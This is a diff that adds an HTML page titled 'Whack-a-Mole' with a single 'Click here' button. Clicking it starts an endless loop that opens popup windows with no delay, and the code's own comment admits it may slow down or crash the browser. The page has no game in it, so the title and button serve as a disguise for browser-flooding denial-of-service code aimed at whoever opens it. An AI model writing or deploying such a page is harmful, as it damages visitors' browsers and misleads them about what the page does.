@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Whack-a-Mole</title>
+    <script>
+        function openPopup() {
+            // Define the content for the popup
+            const content = '<html><head><title>Popup</title></head><body><h1>Popup Window</h1><p>This is a popup window!</p></body></html>';
+            
+            // Data URL with the content
+            const dataUrl = 'data:text/html;charset=utf-8,' + encodeURIComponent(content);
+
+            // Infinite loop to open new popups
+            // Note: This will continue indefinitely and may slow down or crash the browser.
+            // Use responsibly.
+            function openNewPopup() {
+                window.open(dataUrl, '_blank', 'width=300,height=200');
+                setTimeout(openNewPopup, 0); // Open a new popup immediately
+            }
+
+            openNewPopup();
+        }
+    </script>
+</head>
+<body>
+    <button onclick="openPopup()">Click here</button>
+</body>
+</html>
